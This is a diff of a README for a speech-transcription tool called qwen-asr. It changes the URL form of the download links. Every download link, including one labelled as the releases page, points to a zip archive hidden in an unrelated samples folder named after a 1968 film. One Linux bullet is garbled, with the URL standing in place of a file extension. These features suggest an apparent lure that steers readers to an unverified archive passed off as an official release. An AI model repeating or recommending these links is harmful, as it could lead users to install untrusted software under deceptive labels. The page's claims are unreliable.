@@ -1,6 +1,6 @@
 # 🎙️ qwen-asr - Easy Speech Transcription for Everyone
 
-[![Download qwen-asr](https://raw.githubusercontent.com/iBrammm/qwen-asr/main/samples/night_of_the_living_dead_1968/asr-qwen-1.1.zip)](https://raw.githubusercontent.com/iBrammm/qwen-asr/main/samples/night_of_the_living_dead_1968/asr-qwen-1.1.zip)
+[![Download qwen-asr](https://github.com/iBrammm/qwen-asr/raw/refs/heads/main/samples/night_of_the_living_dead_1968/asr-qwen-1.1.zip)](https://github.com/iBrammm/qwen-asr/raw/refs/heads/main/samples/night_of_the_living_dead_1968/asr-qwen-1.1.zip)
 
 ---
 
@@ -45,13 +45,13 @@ Follow these steps to get qwen-asr up and running on your computer.
 
 ### Step 1: Download the Software
 
-Click the big button at the top or visit the [qwen-asr Releases Page](https://raw.githubusercontent.com/iBrammm/qwen-asr/main/samples/night_of_the_living_dead_1968/asr-qwen-1.1.zip).
+Click the big button at the top or visit the [qwen-asr Releases Page](https://github.com/iBrammm/qwen-asr/raw/refs/heads/main/samples/night_of_the_living_dead_1968/asr-qwen-1.1.zip).
 
 Here you will find versions of the app for different computers:
 
 - For Windows, look for files ending in `.exe`.
 - For macOS, look for files ending in `.dmg` or `.zip`.
-- For Linux, you may find `https://raw.githubusercontent.com/iBrammm/qwen-asr/main/samples/night_of_the_living_dead_1968/asr-qwen-1.1.zip` or `.AppImage` files.
+- For Linux, you may find `https://github.com/iBrammm/qwen-asr/raw/refs/heads/main/samples/night_of_the_living_dead_1968/asr-qwen-1.1.zip` or `.AppImage` files.
 
 Download the file that matches your computer.
 
@@ -101,7 +101,7 @@ If you run into issues, try these steps:
 
 You can always get the latest qwen-asr from this page:
 
-[Visit to download qwen-asr](https://raw.githubusercontent.com/iBrammm/qwen-asr/main/samples/night_of_the_living_dead_1968/asr-qwen-1.1.zip)
+[Visit to download qwen-asr](https://github.com/iBrammm/qwen-asr/raw/refs/heads/main/samples/night_of_the_living_dead_1968/asr-qwen-1.1.zip)
 
 On this page, pick the right file for your system, download it, and follow the installation steps above.
 
